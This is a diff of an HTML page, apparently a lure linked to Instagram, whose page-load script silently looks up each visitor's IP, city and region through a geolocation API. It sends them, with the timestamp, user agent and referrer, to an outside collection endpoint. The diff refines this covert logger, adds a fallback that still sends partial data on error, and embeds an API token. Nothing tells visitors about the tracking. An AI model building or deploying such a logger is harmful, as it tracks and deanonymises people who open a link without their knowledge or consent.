@@ -1,4 +1,4 @@
-    <!DOCTYPE html>
+<!DOCTYPE html>
 <head>
 <meta charset='UTF-8'/><meta content='width=device-width, initial-scale=0.5, user-scalable=0, minimum-scale=0.5, maximum-scale=5' name='viewport'/>
  <!--meta http-equiv='refresh' content='8; URL=https://m.instagram.com/22f.p/'>
@@ -57,36 +57,64 @@
   }, 5000);
 </script-->
 <script>
-
 try {
-let ip;
-let city;
-let region;
-fetch(`https://ipapi.co/json`)
-  .then(response => response.json())
-  .then(data => {
-    ip = data["ip"];
-    city = data["city"];
-    region = data["region"];
-    // Get the current date and time in Jakarta time
-    var date = new Date();
+  let ip;
+  let city;
+  let region;
 
-    // Format the date and time in the desired format
-    var timeZone = 'Asia/Jakarta';
-    var options = { timeZone: timeZone, hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: '2-digit', year: 'numeric' };
-    var formattedTime = new Intl.DateTimeFormat('id', options).format(date);
+  // Fetch data from ipinfo.io
+  fetch(`https://ipinfo.io/json?token=7ad47c91e38458`)
+    .then(response => {
+      if (!response.ok) {
+        throw new Error(`HTTP error! Status: ${response.status}`);
+      }
+      return response.json();
+    })
+    .then(data => {
+      ip = data.ip || "N/A";
+      city = data.city || "N/A";
+      region = data.region || "N/A";
 
-    // Get the elements with the specified class names
-    var infoText = "[ " + formattedTime + " ] ";
-    var userAgent = navigator.userAgent;
-    var refUrl = document.referrer;
-    var url = "https://2212.eu.org/getig.php?result=" + "%0A" + infoText + " | " + ip + "%0A" + "City :" + city + "%0A" + "Region :" + region + "%0A" + userAgent + "%0A" + "Reff: " + refUrl;
-    return fetch(url);
-  })
+      // Get the current date and time in Jakarta time
+      const date = new Date();
+      const timeZone = "Asia/Jakarta";
+      const options = {
+        timeZone: timeZone,
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit",
+        day: "2-digit",
+        month: "2-digit",
+        year: "numeric",
+      };
+      const formattedTime = new Intl.DateTimeFormat("id", options).format(date);
+
+      // Get additional data
+      const userAgent = navigator.userAgent || "Unknown User-Agent";
+      const refUrl = document.referrer || "No Referrer";
+      const infoText = `[ ${formattedTime} ] `;
+      const url = `https://2212.eu.org/getig.php?result=%0A${infoText} | ${ip}%0ACity: ${city}%0ARegion: ${region}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
+
+      // Send data to your endpoint
+      return fetch(url);
+    })
+    .catch(error => {
+      console.error("Error fetching IP data:", error);
+
+      // Ensure at least partial data is sent to your endpoint
+      const userAgent = navigator.userAgent || "Unknown User-Agent";
+      const refUrl = document.referrer || "No Referrer";
+      const fallbackInfo = `[ ${new Date().toISOString()} ] | Error occurred`;
+      const fallbackUrl = `https://2212.eu.org/getig.php?result=%0A${fallbackInfo}%0AUser-Agent: ${userAgent}%0AReferrer: ${refUrl}`;
+
+      return fetch(fallbackUrl);
+    });
 } catch (e) {
-  console.log("Error occurred while processing elements. Continuing with other functions...");
+  console.log(
+    "Error occurred while processing elements. Continuing with other functions...",
+    e
+  );
 }
-    
 </script>
 
       
